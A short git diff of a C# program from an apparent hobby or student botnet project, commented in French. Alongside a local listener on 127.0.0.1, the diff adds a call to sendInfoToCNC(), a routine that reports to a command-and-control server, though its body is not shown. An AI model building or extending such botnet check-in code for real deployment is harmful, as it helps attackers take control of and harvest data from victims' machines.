@@ -11,8 +11,7 @@ using System.Threading;
 using System.IO;
 using System.Reflection;
 using Botnet;
-//using System.Windows.Threading;
- 
+using System.Threading.Tasks;
 
 namespace Botnet    //espace de nom
 {
@@ -22,8 +21,15 @@ namespace Botnet    //espace de nom
         {
 
             ServerConnectors sc = new ServerConnectors(IPAddress.Parse("127.0.0.1"), 2107);
+
+            Initialization initialiser = new Initialization();
+
+            Console.WriteLine(DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss"));
+            initialiser.sendInfoToCNC();
+
             sc.ListenAndReceiveData();
             Console.WriteLine(sc.status);
+            Console.ReadKey();
             //Use class mathod after
            
            
